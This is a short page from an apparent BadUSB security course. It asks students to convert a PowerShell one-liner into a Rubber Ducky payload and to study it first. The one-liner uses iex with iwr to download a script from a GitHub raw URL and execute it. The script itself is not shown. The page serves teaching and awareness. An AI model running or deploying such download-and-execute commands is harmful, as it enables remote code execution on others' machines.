---
layout: default
title: Dangerous(2)
nav_order: 55
---
# Dangerous code(2)
In our labs, we sent data to pastebin. But what if we used pastebin (or github) to host our malicious code?!
Duckify this powershell command:
Here's another sneaky piece of code.
Can you see what it does?

```powershell
iex((iwr https://raw.githubusercontent.com/kenvb/badusb/refs/heads/main/docs/dangerouscode2.ps1).content)
```
But before you do. 

PLEASE LOOK AT THE CODE AND UNDERSTAND IT!

Always be vigilant!

A little tip: should you find a piece of Powershell-code online, how about copy pasting it to an LLM and see what it has to say about it.

Some words of caution:

Please don't blindly do this with an internal script, written by a colleague. Especially if you have no idea what it does. You might inadvertently leak precious information.
